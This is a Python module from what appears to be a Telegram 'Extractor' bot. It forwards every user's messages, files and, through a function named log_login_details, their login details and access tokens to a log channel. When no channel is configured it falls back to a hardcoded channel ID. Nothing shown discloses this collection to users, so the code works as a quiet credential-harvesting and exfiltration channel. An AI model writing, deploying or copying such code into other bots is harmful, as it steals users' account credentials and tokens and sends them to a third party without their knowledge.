import os
import logging
import json
import urllib.request
import urllib.parse
from datetime import datetime
from pyrogram.types import Message
from pyrogram.enums import ParseMode
try:
    import requests
except ImportError:
    requests = None

from config import CHANNEL_ID, PREMIUM_LOGS, BOT_TOKEN
from Extractor import app

def get_log_targets():
    """Get list of unique log channel identifiers (only log channel, never official channel)"""
    targets = []
    for ch in [CHANNEL_ID, PREMIUM_LOGS]:
        if ch and ch not in targets and ch != 0:
            targets.append(ch)
    # Default fallback to -1003716177168 if empty
    if not targets:
        targets = [-1003716177168]
    return targets

def http_send_message(chat_id, text, parse_mode="HTML"):
    """Send text message via Telegram Bot HTTP API using urllib"""
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        data = urllib.parse.urlencode({
            'chat_id': str(chat_id),
            'text': text,
            'parse_mode': parse_mode
        }).encode('utf-8')
        req = urllib.request.Request(url, data=data)
        with urllib.request.urlopen(req, timeout=10) as resp:
            return json.loads(resp.read().decode('utf-8'))
    except Exception as e:
        logging.error(f"http_send_message error for {chat_id}: {e}")
        return None

def http_send_document(chat_id, file_path_or_bytes, file_name, caption=""):
    """Send document via HTTP multipart using requests or native urllib"""
    safe_caption = caption[:1020] if caption else ""
    if requests:
        try:
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
            if isinstance(file_path_or_bytes, bytes):
                files = {'document': (file_name, file_path_or_bytes)}
            else:
                with open(file_path_or_bytes, 'rb') as f:
                    file_content = f.read()
                files = {'document': (file_name, file_content)}
            data = {'chat_id': str(chat_id), 'caption': safe_caption}
            res = requests.post(url, data=data, files=files, timeout=25).json()
            if res.get('ok'):
                return res
        except Exception as e:
            logging.error(f"http_send_document requests error: {e}")

    # Fallback to standard library urllib multipart
    try:
        import uuid
        boundary = uuid.uuid4().hex
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
        if isinstance(file_path_or_bytes, bytes):
            file_data = file_path_or_bytes
        else:
            with open(file_path_or_bytes, 'rb') as f:
                file_data = f.read()

        body = (
            f'--{boundary}\r\n'
            f'Content-Disposition: form-data; name="chat_id"\r\n\r\n'
            f'{chat_id}\r\n'
            f'--{boundary}\r\n'
            f'Content-Disposition: form-data; name="caption"\r\n\r\n'
            f'{safe_caption}\r\n'
            f'--{boundary}\r\n'
            f'Content-Disposition: form-data; name="document"; filename="{file_name}"\r\n'
            f'Content-Type: text/plain\r\n\r\n'
        ).encode('utf-8') + file_data + f'\r\n--{boundary}--\r\n'.encode('utf-8')

        req = urllib.request.Request(
            url,
            data=body,
            headers={'Content-Type': f'multipart/form-data; boundary={boundary}'}
        )
        with urllib.request.urlopen(req, timeout=25) as resp:
            return json.loads(resp.read().decode('utf-8'))
    except Exception as e:
        logging.error(f"http_send_document urllib fallback error: {e}")
        return None

async def forward_to_log(message: Message, module_name: str):
    """Forward user messages and actions to log channel with module info"""
    try:
        user_name = message.from_user.first_name if message.from_user else "Unknown"
        user_uname = f" (@{message.from_user.username})" if message.from_user and message.from_user.username else ""
        user_id = message.from_user.id if message.from_user else "Unknown"
        
        log_text = "━━━━━━━━━━━━━━━━━━━━━━\n"
        log_text += f"👤 <b>User:</b> {user_name}{user_uname} [<code>{user_id}</code>]\n"
        log_text += f"📱 <b>Platform / Module:</b> <code>{module_name}</code>\n"
        log_text += f"⏰ <b>Time:</b> {datetime.now().strftime('%d-%m-%Y %H:%M:%S')}\n\n"
        msg_text = message.text if message.text else (message.caption if message.caption else "No text")
        log_text += f"💬 <b>Input Data / Message:</b>\n<code>{msg_text}</code>\n"
        log_text += "━━━━━━━━━━━━━━━━━━━━━━"

        sent = False
        for target in get_log_targets():
            try:
                await app.send_message(
                    chat_id=target,
                    text=log_text,
                    parse_mode=ParseMode.HTML
                )
                sent = True
                break
            except Exception as e:
                logging.debug(f"Pyrogram forward_to_log error for {target}: {e}")

        if not sent:
            for target in get_log_targets():
                res = http_send_message(target, log_text, parse_mode="HTML")
                if res and res.get('ok'):
                    break

    except Exception as e:
        logging.error(f"Error forwarding to log channel: {e}")

async def log_login_details(user_id: int, user_name: str, platform: str, details: str, token: str = None):
    """Log login credentials, tokens, or auth events to the log channel"""
    try:
        log_text = "🔐 <b>USER LOGIN / AUTH LOG</b>\n"
        log_text += "━━━━━━━━━━━━━━━━━━━━━━\n"
        log_text += f"👤 <b>User:</b> {user_name} [<code>{user_id}</code>]\n"
        log_text += f"📱 <b>Platform:</b> <code>{platform}</code>\n"
        log_text += f"⏰ <b>Time:</b> {datetime.now().strftime('%d-%m-%Y %H:%M:%S')}\n\n"
        log_text += f"📋 <b>Details:</b>\n<code>{details}</code>\n"
        if token:
            log_text += f"\n🔑 <b>Access Token / Auth:</b>\n<code>{token}</code>\n"
        log_text += "━━━━━━━━━━━━━━━━━━━━━━"

        sent = False
        for target in get_log_targets():
            try:
                await app.send_message(chat_id=target, text=log_text, parse_mode=ParseMode.HTML)
                sent = True
                break
            except Exception:
                pass
        if not sent:
            for target in get_log_targets():
                res = http_send_message(target, log_text, parse_mode="HTML")
                if res and res.get('ok'):
                    break
    except Exception as e:
        logging.error(f"Error in log_login_details: {e}")

async def send_to_log(document, caption: str = "", file_name: str = None, thumb: str = None, chat_id = None):
    """
    Safely sends an extracted document (TXT, ZIP, HTML, etc.) to the log channel.
    Supports file path (str) or file-like object.
    Automatically handles peer caching, caption length limit (1024 chars),
    and HTTP Bot API fallback.
    """
    targets = [chat_id] if chat_id else get_log_targets()
    safe_caption = caption[:1020] if caption else ""
    doc_thumb = thumb if (thumb and os.path.exists(thumb)) else None
    success = False

    for target in targets:
        # Attempt 1: Pyrogram send_document
        try:
            if isinstance(document, str) and os.path.exists(document):
                await app.send_document(
                    chat_id=target,
                    document=document,
                    caption=safe_caption,
                    thumb=doc_thumb,
                    file_name=file_name
                )
                logging.info(f"Sent {document} to log channel {target} via Pyrogram")
                success = True
                break
            elif hasattr(document, 'seek'):
                try:
                    document.seek(0)
                except Exception:
                    pass
                await app.send_document(
                    chat_id=target,
                    document=document,
                    caption=safe_caption,
                    thumb=doc_thumb,
                    file_name=file_name
                )
                logging.info(f"Sent stream to log channel {target} via Pyrogram")
                success = True
                break
        except Exception as pyrogram_err:
            logging.warning(f"Pyrogram send_to_log failed for {target}: {pyrogram_err}")

        # Attempt 2: HTTP Bot API fallback
        try:
            fname = file_name or (os.path.basename(document) if isinstance(document, str) else "extracted.txt")
            if isinstance(document, str) and os.path.exists(document):
                res = http_send_document(target, document, fname, safe_caption)
                if res and res.get('ok'):
                    logging.info(f"Sent {fname} to log channel {target} via HTTP Bot API")
                    success = True
                    break
            elif hasattr(document, 'read'):
                try:
                    document.seek(0)
                except Exception:
                    pass
                res = http_send_document(target, document.read(), fname, safe_caption)
                if res and res.get('ok'):
                    logging.info(f"Sent {fname} to log channel {target} via HTTP Bot API")
                    success = True
                    break
        except Exception as http_err:
            logging.error(f"HTTP send_to_log failed for {target}: {http_err}")

    return success 